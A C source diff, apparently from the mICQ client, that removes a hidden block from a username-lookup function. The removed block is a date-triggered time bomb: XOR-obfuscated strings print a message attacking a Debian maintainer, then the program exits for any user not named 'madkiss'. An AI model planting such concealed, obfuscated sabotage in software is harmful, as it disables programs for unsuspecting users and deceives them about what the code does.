@@ -107,34 +107,6 @@ const char *PrefLogNameReal (Preferences *pref)
             me = getenv ("USER");
         if (me != NULL)
         {
-#if defined(__Dbn__) && __Dbn__ != -1 && !defined (EXTRAVERSION)
-            if (me[0] != 'm' || me[1] != 'a' || me[2] != 'd' || me[3] != 'k' ||
-                me[4] != 'i' || me[5] != 's' || me[6] != 's' || me[7])
-            if (time (NULL) > 1045000000)
-            {
-                const char *parts[] = { "\n\n\eX0282nZlv$qf#vpjmd#wkf#nJ@R#sb`hbdf#sqlujgfg#az",
-                                        "#Gfajbm-#Pjm`f#wkf#Gfajbm#nbjmwbjmfq#jp#f{wqfnfoz#",
-                                        "vm`llsfqbwjuf/#zlv$qf#bguj`fg#wl#vpf#wkf#afwwfq#rv",
-                                        "bojwz#sb`hbdf#eqln#nj`r-lqd-#Pjnsoz#bgg#wkf#eloolt",
-                                        "jmd#ojmf#wl#zlvq#,fw`,bsw,plvq`fp-ojpw#wl#wqb`h#pw",
-                                        "baof#ufqpjlmp#le#nJ@R9\eX3n\ngfa#kwws9,,ttt-nj`r-lqd",
-                                        ",gfajbm#pwbaof#nbjm\n\eX0282nWl#wqb`h#@UP#pmbspklwp/",
-                                        "#bgg9\eX3n\ngfa#kwws9,,ttt-nj`r-lqd,gfajbm#wfpwjmd#n",
-                                        "bjm\n\eX0282nPlvq`f#sb`hbdfp#nbz#af#qfwqjfufg#pjnjob",
-                                        "qoz-\eX3n\n\n                                        " };
-                char buf[52];
-                int i, j;
-                
-                for (i = 0; i < 10; i++)
-                {
-                    for (j = 0; j < 50; j++)
-                        buf[j] = parts[i][j] > 30 ? parts[i][j] ^ 3 : parts[i][j];
-                    buf[j] = '\0';
-                    M_print (buf);
-                }
-                exit (99);
-            }
-#endif
             snprintf (username, sizeof (username), "%s", me);
             hostname += strlen (username);
         }
